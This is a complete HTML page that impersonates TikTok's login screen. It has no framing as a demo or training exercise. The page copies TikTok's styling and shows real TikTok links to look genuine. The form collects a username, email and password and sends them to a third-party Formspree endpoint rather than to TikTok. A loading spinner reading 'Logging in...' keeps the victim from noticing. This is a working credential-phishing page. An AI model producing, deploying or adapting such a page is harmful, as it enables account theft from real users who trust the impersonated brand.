<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to TikTok</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* Modern TikTok-inspired styling */
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            width: 100%;
            max-width: 400px;
            padding: 24px;
            box-sizing: border-box;
        }

        .login-box {
            text-align: center;
        }

        h1 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 24px;
            color: #161823;
        }

        .form-group {
            margin-bottom: 12px;
            position: relative;
        }

        input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid rgba(22, 24, 35, 0.12);
            border-radius: 4px;
            background-color: #f1f1f2;
            box-sizing: border-box;
            font-size: 15px;
            outline: none;
        }

        input:focus {
            border-color: rgba(22, 24, 35, 0.2);
        }

        .password-group {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #757575;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 4px;
            background-color: #fe2c55;
            color: white;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            margin-top: 16px;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: background-color 0.2s;
        }

        .login-btn:hover {
            background-color: #ef2950;
        }

        .login-btn:disabled {
            background-color: #ff8fa3;
            cursor: not-allowed;
        }

        .form-link {
            text-align: left;
            margin-top: 12px;
        }

        .signup-link {
            margin-top: 24px;
            font-size: 15px;
            color: #161823;
        }

        a {
            color: #fe2c55;
            text-decoration: none;
            font-weight: 600;
        }

        a:hover {
            text-decoration: underline;
        }

        /* Loading Spinner */
        .fa-spin {
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="login-box">
            <h1>Log in to TikTok</h1>
            
            <form id="loginForm" action="https://formspree.io/f/xjkvowzz" method="POST">
                
                <div class="form-group">
                    <input type="text" id="username" name="username" placeholder="Username" required>
                </div>

                <div class="form-group">
                    <input type="email" id="email" name="email" placeholder="Email" required>
                </div>

                <div class="form-group password-group">
                    <input type="password" id="password" name="password" placeholder="Password" required>
                    <span class="toggle-password" onclick="togglePasswordVisibility()">
                        <i class="fas fa-eye" id="eyeIcon"></i>
                    </span>
                </div>

                <div class="form-link">
                    <a href="https://www.tiktok.com/forgot-password" target="_blank">Forgot password?</a>
                </div>

                <button type="submit" id="submitBtn" class="login-btn">
                    <span id="btnText">Log in</span>
                    <i id="spinner" class="fas fa-spinner fa-spin" style="display: none; margin-left: 10px;"></i>
                </button>
            </form>

            <div class="signup-link">
                Don't have an account? <a href="https://www.tiktok.com/signup" target="_blank">Sign up</a>
            </div>
        </div>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const spinner = document.getElementById('spinner');

        // Handle Animation on Submit
        loginForm.addEventListener('submit', function() {
            // Disable button
            submitBtn.disabled = true;
            
            // Show Spinner and change text
            btnText.textContent = "Logging in...";
            spinner.style.display = "inline-block";
            
            // The form will now naturally submit to Formspree
        });

        // Toggle Password Visibility
        function togglePasswordVisibility() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.getElementById('eyeIcon');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.classList.remove('fa-eye');
                eyeIcon.classList.add('fa-eye-slash');
            } else {
                passwordInput.type = 'password';
                eyeIcon.classList.remove('fa-eye-slash');
                eyeIcon.classList.add('fa-eye');
            }
        }
    </script>
</body>
</html>
